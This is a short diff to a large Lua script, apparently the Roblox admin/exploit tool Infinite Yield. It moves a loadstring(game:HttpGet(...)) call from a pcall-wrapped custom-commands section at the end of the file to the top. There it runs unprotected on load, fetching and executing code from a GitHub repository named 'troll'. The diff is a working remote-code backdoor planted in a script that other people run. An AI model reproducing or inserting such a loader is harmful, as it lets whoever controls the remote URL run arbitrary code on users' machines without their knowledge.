@@ -4,6 +4,9 @@ if IY_LOADED and not _G.IY_DEBUG == true then
 end
 
 pcall(function() getgenv().IY_LOADED = true end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dunnook/troll/main/command"))()
+
 COREGUI = game:GetService("CoreGui")
 if not game:IsLoaded() then
 	local notLoaded = Instance.new("Message")
@@ -12014,10 +12017,6 @@ if PluginsTable ~= nil or PluginsTable ~= {} then
 	FindPlugins(PluginsTable)
 end
 
---CustomCommands
-pcall(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/dunnook/troll/main/command"))()
-end)
 
 -- Events
 eventEditor.RegisterEvent("OnExecute")
